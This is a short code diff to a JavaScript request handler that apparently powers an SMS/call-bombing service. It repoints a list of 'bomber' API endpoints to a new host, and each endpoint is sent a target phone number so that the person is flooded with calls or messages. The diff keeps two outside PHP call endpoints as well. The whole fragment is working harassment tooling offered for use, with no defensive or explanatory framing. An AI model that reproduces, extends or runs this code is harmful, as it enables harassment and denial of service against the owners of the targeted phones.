@@ -13,12 +13,12 @@ export default async function handler(req, res) {
 
     // API endpoints
     const apis = [
-        `https://tcsbomberai.vercel.app/api/bomber1?phone=${phone}`,
-        `https://tcsbomberai.vercel.app/api/bomber2?phone=${phone}`,
-        `https://tcsbomberai.vercel.app/api/bomber4?num=${phone}`,
+        `https://api-kappa-eight-29.vercel.app/bomber1.js?phone=${phone}`,
+        `https://api-kappa-eight-29.vercel.app/bomber2.js?phone=${phone}`,
+        `https://api-kappa-eight-29.vercel.app/bomber4.js?num=${phone}`,
         `http://mrn-bio.social-networking.me/cobraCll.php?num=${phone}`,
         `https://yousuf323215.serv00.net/call90.php?number=${phone}`,
-        `https://tcsbomberai.vercel.app/api/bomber3?phone=${phone}`  // Added API
+        `https://api-kappa-eight-29.vercel.app/bomber3.js?phone=${phone}`  // Added API
     ];
 
     let successCount = 0;
